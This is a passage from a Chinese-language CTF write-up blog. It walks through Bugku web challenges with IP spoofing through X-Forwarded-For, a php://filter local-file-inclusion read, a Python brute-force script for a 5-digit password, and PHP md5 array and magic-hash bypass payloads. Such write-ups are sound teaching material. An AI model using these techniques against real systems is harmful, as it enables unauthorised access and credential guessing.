alt="在这里插入图片描述"><br><strong>flag：ctf{whatfk}</strong></p><h3 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h3><p>这道题确实跟它的描述一样，什么也没有。。。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202011112346280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="抓包-1"><a href="#抓包-1" class="headerlink" title="抓包"></a>抓包</h5><p>这时候只能抓包看一下，或者扫扫目录什么的，抓包发包的时候发现了flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111234729419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{Bugku_k8_23s_istra}</strong></p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>打开后是一个黑页。根据题意，实战中经常遇到，一般就是有大马这种，既然是实战，那就先扫扫目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111235446173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h5><p>访问后发现需要密码，试了试一些常规的shell弱口令得到flag，密码为hack：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111235611968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>*<em>flag：flag{hack_bug_ku035} *</em></p><h3 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h3><p>首先F12查看源代码，一定要看完，在最后一行有一段base64加密的字符串<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112000115937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>解密后是test123，应该就是密码了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112000233348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但是当我们去登录的时候，登陆页面对IP进行了限制，只允许本地访问，那我们抓个包，加一下X-Forwarded-For: 127.0.0.1来绕过一下把：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112000522330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="抓包改包"><a href="#抓包改包" class="headerlink" title="抓包改包"></a>抓包改包</h5><p>得到flag，这里确实是MD5加密了，但是flag就是这串密文：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112000459639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{85ff2ee4171396724bae20c0bd851f6b}</strong></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><h5 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h5><p>访问后看一下源码，发现了这一串东西：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span><span class="token punctuation">;</span><span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'%35%34%61%61%32'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>放在Hackbar里解码后大概是这个样子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span>typeof a<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"67d709b2b;54aa2aa648cf6e87a7114f1"</span><span class="token operator">==</span>a<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"levelQuest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span>\'<span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">32</span>\' <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是那串判断中被加密的条件<strong>67d709b2b;54aa2aa648cf6e87a7114f1</strong>，提交得到flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111209394374.png#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：KEY{J22JK-HS11}</strong></p><h3 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h3><h5 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h5><p>这里涉及到通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码，题目也说了flag在index里，如果我们直接包含index.php，程序是会把它执行的，并不会输出源码，但是我们如果利用LFI漏洞来读取index，是会读到一串加密的字符串的：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112095840709.png#pic_center" alt="在这里插入图片描述"></p><p>base64解码后得到flag：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Bugku<span class="token operator">-</span>ctf<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'&lt;a href="./index.php?file=show.php">click me? no&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag:flag{edulcni_elif_lacol_si_siht}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flag:flag{edulcni_elif_lacol_si_siht}</strong></p><h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p>看题目地址，提示爆破，且密码长度为5位数，用Python写个脚本就行了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201114181838292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="Python编写exp"><a href="#Python编写exp" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">dic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 从0到9999开始遍历输出</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 如果i的长度小于5</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 前面用0补全，最多5位，追加到value中</span>            value<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">-</span>len<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 追加到value中</span>            value<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'开始爆破，请稍等...'</span>    <span class="token comment" spellcheck="true"># 遍历value中的值赋给j</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> value<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'pwd'</span><span class="token punctuation">:</span>j<span class="token punctuation">}</span>        <span class="token keyword">print</span> <span class="token string">'尝试密码：'</span><span class="token punctuation">,</span>j        <span class="token comment" spellcheck="true"># post数据</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>        req<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>        <span class="token comment" spellcheck="true"># 获取返回页面的信息</span>        html2 <span class="token operator">=</span> req<span class="token punctuation">.</span>text        <span class="token comment" spellcheck="true"># 与模板进行对比，如果返回的信息不一致则进行正则匹配，直接打印出flag</span>        <span class="token keyword">if</span> html2 <span class="token operator">!=</span> html1<span class="token punctuation">:</span>            flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'flag.+'</span><span class="token punctuation">,</span> html1<span class="token punctuation">)</span>            <span class="token keyword">print</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义URL，和一个接收密码的字典</span>    url <span class="token operator">=</span> <span class="token string">'http://123.206.87.240:8002/baopo/?yes'</span>    value <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 定义一个对比模板</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'pwd'</span><span class="token punctuation">:</span> <span class="token string">'00000'</span><span class="token punctuation">}</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    html1 <span class="token operator">=</span> req<span class="token punctuation">.</span>text    <span class="token comment" spellcheck="true"># 开怼</span>    dic<span class="token punctuation">(</span><span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有时间的去跑一跑，太耽误事儿了，密码：13579</p><p><strong>flag：flag{bugku-baopo-hah}</strong></p><h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><h5 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>题目都说了，那咱们就拿出御剑来，专门扫一下.bak这种的备份文件吧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112133736532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="代码审计-3"><a href="#代码审计-3" class="headerlink" title="代码审计"></a>代码审计</h5><p>下载后打开，是一道代码审计题，这是它的源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们一段一段来分析，首先分析它对url参数过滤的代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 包含本地文件flag.php</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 取消报错</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># strstr是查找字符串的首次出现，这里捕获的是当前url?后的所有字符串，捕获之后返回给str</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># substr是取字符串中的子串，这个可以理解为str变成了一个列表，里所有的字符串变成了单一的元素；</span><span class="token shell-comment comment"># 从0开始计数，这里1的意思是，从1开始取出后面所有的元素拼接成一个新的字符串重新赋值给str</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># str_replace的作用是替换，这里将str中的</span><span class="token string">'key'</span>替换为<span class="token string">''</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 把str解析成变量，这里也就是解析key1跟key2</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了方便理解，我在本地改了一下代码，让它输出一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'&lt;br>&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'&lt;br>&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'&lt;br>&lt;br>'</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问一下，你可能会发现这俩MD5是一样的，但我们传的值是不一样的，这是因为我们的key被过滤了，这里md5()相当于加密了个空气：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112163740433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h5><p>接着分析剩下的代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># 这里接上面的取值加密</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 这里要求md5加密的值一样且未加密的值不同，就输出flag.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个md5()函数，处理不了传入的数组，所以我们构造url的时候在key后加[]=xx，又经过parse_str()的处理，所以就变成了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$kekeyy1</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>xxx<span class="token operator">&amp;</span><span class="token variable">$kekeyy2</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>axxs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样一来就符合条件了：</p><pre class="line-numbers language-php"><code class="language-php">exp：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web16/index.php?kkeyey1[]=0e1&amp;kkeyey2[]=xxx</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一种绕过方法，就是利用==比较漏洞，在php中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p><pre><code>下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387a</code></pre><p>构造payload：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web16/index.php?kkeyey1=QNKCDZO&amp;kkeyey2=s155964671a</span><span aria-hidden="true" 